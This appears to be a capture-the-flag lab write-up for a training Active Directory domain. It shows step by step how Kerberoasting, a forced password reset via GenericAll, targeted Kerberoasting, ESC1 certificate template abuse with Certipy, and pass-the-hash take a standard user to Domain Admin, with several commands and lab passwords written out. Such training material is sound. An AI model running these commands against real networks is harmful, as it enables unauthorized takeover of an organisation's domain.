---
title: Arasaka Write-up
date: 2026-02-07
categories: [Hacksmarter, Write-up]
tags: [write-up, tutorial, hacksmarter]
author: Mohamad Helmi
description: "Simulating a realistic attack, identifying and exploiting vulnerabilities to escalate privileges"
---

# Objective

You are a member of the Hack Smarter Red Team. This penetration test will operate under an assumed breach scenario, starting with valid credentials for a standard domain user, **faraday**.

The primary goal is to simulate a realistic attack, identifying and exploiting vulnerabilities to escalate privileges from a standard user to a Domain Administrator.

Starting credentials:
```
faraday:hacksmarter123
```

---

### Recon

#### NMAP

First and foremost, run **nmap** scan to identify the open ports and services that are running.

```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-02-07 14:58:00Z)
135/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
445/tcp  open  microsoft-ds? syn-ack ttl 126
464/tcp  open  kpasswd5?     syn-ack ttl 126
593/tcp  open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
3268/tcp open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
3269/tcp open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
3389/tcp open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Issuer: commonName=DC01.hacksmarter.local
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTER
|   NetBIOS_Domain_Name: HACKSMARTER
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hacksmarter.local
|   DNS_Computer_Name: DC01.hacksmarter.local
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-07T14:58:45+00:00
|_ssl-date: 2026-02-07T14:59:24+00:00; +1s from scanner time.
5985/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

From the result, we see that there are **ldap**, **kerberos**, **ms server**, etc running. We can confirm that this an active directory network.

Next, let's try to list all the available shares.

![list shares](/assets/img/posts/2026-02-07-arasaka-writeup/list_shares.png)

Hmm, none of these are interesting.

#### Bloodhound

Let's run bloodhound ingestor to get comprehensive view about the network.

![bloodhound ingestor](/assets/img/posts/2026-02-07-arasaka-writeup/bloodhound_ingestor.png)

And upload the zip file into bloodhound.

![faraday bloodhound](/assets/img/posts/2026-02-07-arasaka-writeup/faraday_bloodhound.png)

It seems faraday has no outbound object control. The only thing we got here is faraday belongs to domain users group. Nothing out of ordinary.

Let's see the kerberoastable users.

![svc.alt](/assets/img/posts/2026-02-07-arasaka-writeup/alt.svc_kerberoastable.png)

We see that ***alt.svc*** user is kerberoastable. Looking into details.

![genericAll](/assets/img/posts/2026-02-07-arasaka-writeup/genericAll_alt.svc.png)

***alt.svc*** has generiAll on ***yorinobu***.

![genericWrite](/assets/img/posts/2026-02-07-arasaka-writeup/genericWrite_yorinobu.png)

And ***yorinobu*** has genericWrite permission on ***soulkiller.svc***.

After we couldn't any further as ***soulkiller.svc***. Let's exploit on what we have now.

---

### Access as alt.svc

Since we ***alt.svc*** is kerberoastable, we could retrive the account TGS. [Here](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast)

Using the following command:
```bash 
nxc --verbose ldap $IP -u faraday -p hacksmarter123 --kerberoasting kerberoast.txt
```

Then we got the TGS of the ***alt.svc*** user.

![tgs](/assets/img/posts/2026-02-07-arasaka-writeup/alt.svc_tgs.png)

Next, we crack the TGS with hashcat to retrieve the password for ***alt.svc***. Make sure to use the correct mode to crack. All of the list is [here](https://hashcat.net/wiki/doku.php?id=example_hashes)

```bash
$ hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt 
```

![cracked tgs](/assets/img/posts/2026-02-07-arasaka-writeup/tgs_cracked.png)

And we got the password, **babygirl1**

---

### Access as yorinobu

From our Bloodhound analysis we know that ***alt.svc*** has a **GenericAll** relationship to ***yorinobu***. This allows us to change the password of the user. The following [resource](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword) showcases the different tools we could use to change the password of the user.

We going to use **bloodyAD**

```bash
$ bloodyAD --host DC01.hacksmarter.local -d hacksmarter.local -u alt.svc -p 'babygirl1' set password 'yorinobu' 'Password123'      
[+] Password changed successfully!
```

---

### Access as soulkiller.svc

From our Bloodhound analysis we know that yorinobu has a **GenericWrite** relationship to ***soulkiller.svc***. This allows either a TargetedKerberoast or Shadow Credentials Atttack.

With the **GenericWrite** permission we are able to modify ***soulkiller.svc'***s servicePrincipalName (SPN),  we request a service ticket for it, and perform offline Kerberos ticket cracking to recover its password.

In a Shadow Credentials Attack we abuse the GenericWrite permission to add a malicious key credential to ***soulkiller.svc***, allowing authentication as that account without knowing its password.

For now, we will use TargetedKerberoast. Read [here](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting)

We will be using [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast)

After run the command, we able to get the AES-REP of the ***soulkiller.svc*** user.

![soulkiller tgs](/assets/img/posts/2026-02-07-arasaka-writeup/soulkiller.svc_tgs.png)

Then we crack the hash with hashcat.

![soulkiller password](/assets/img/posts/2026-02-07-arasaka-writeup/soulkiller.svc_password.png)

And we got the password for ***soulkiller.svc***.

---

### Access as the_emperor

As already mentioned, we seem to have reached a dead end. But we haven't checked for poorly configured certificates yet. 

In addition to using BloodHound to enumerate objects and relationships within Active Directory, there are also tools specifically designed for enumerating certificate-related vulnerabilities. Notable examples include Certipy and SpecterOps' research, which help identify vulnerable certificate templates that can be exploited for privilege escalation.

We use Certipy to search for faulty certificates that allow privilege escalation. Maybe there are some, and maybe soulkiller.svc can enroll them.

We are issuing the following command and receive a json output with the results. The certificate templates ***AI_Takeover*** is misconfigured to allow any authenticated user to enroll and supply arbitrary subject names, enabling **ESC1 attacks** for impersonation via client authentication.

```bash
certipy-ad find -u soulkiller.svc@hacksmarter.local -p 'MYpassword123#' -dc-ip $IP -text -enabled -hide-admins -vulnerable
```

![certipy](/assets/img/posts/2026-02-07-arasaka-writeup/certipy.png)

Our free Exegol container still uses the old version v4.8.2. The current version is 5.0.4 covering all known ***ESC1-ESC16*** attack paths.

We inspect the JSON and a Certificate Template called ***AI_Takeover*** vulnerable to ESC1 could be identified.

```text
Certificate Authorities
  0
    CA Name                             : hacksmarter-DC01-CA
    DNS Name                            : DC01.hacksmarter.local
    Certificate Subject                 : CN=hacksmarter-DC01-CA, DC=hacksmarter, DC=local
    Certificate Serial Number           : 1DBC9F9ECF287FB04FDE66106578611F
    Certificate Validity Start          : 2025-09-21 15:32:14+00:00
    Certificate Validity End            : 2030-09-21 15:42:14+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Access Rights
        Enroll                          : HACKSMARTER.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : AI_Takeover
    Display Name                        : AI_Takeover
    Certificate Authorities             : hacksmarter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-09-21T16:16:36+00:00
    Template Last Modified              : 2025-09-21T16:16:36+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HACKSMARTER.LOCAL\Soulkiller.svc
    [+] User Enrollable Principals      : HACKSMARTER.LOCAL\Soulkiller.svc
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

The certificate:

![certificate](/assets/img/posts/2026-02-07-arasaka-writeup/certificate.png)

The classification of the vulnerability:

![vulnerability](/assets/img/posts/2026-02-07-arasaka-writeup/vulnerability.png)

The details of the misconfiguration and how we leverage it can be found [here](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication)

In short the ESC1 Enterprise Security Control 1 is an AD CS (Active Directory Certificate Services) misconfiguration where the CA is configured to allow any authenticated user to request certificates based on a template that permits Client Authentication and allows the requester to supply arbitrary Subject Alternative Names (SANs). This enables us to impersonate other users, including domain admins, by obtaining valid certificates

From our initial BloodHound Analysis w know that the user {{ %raw% }}***the_emperor***{{ %endraw% }} is a domain admin. We will target this user.

We request a certificate as ***soulkiller.svc***, specify the Certificate Authority ***hacksmarter-DC01-CA***, the domain hacksmarter.local and the vulnerable certificate template ***AI_Takeovere***. Furthermore, the upn ***the_emperor@hacksmarter.local*** to impersonate this identity. We receive a .pfx file.

![request certificate](/assets/img/posts/2026-02-07-arasaka-writeup/request_certificate.png)

Then, we authenticate ***the_emperor*** with the .pfx file to get NT hash.

![certipy auth](/assets/img/posts/2026-02-07-arasaka-writeup/certipy_auth.png)

We can pass the hash to evil-winrm and get a session. We are now a domain admin.

![root](/assets/img/posts/2026-02-07-arasaka-writeup/root.png)

**The end**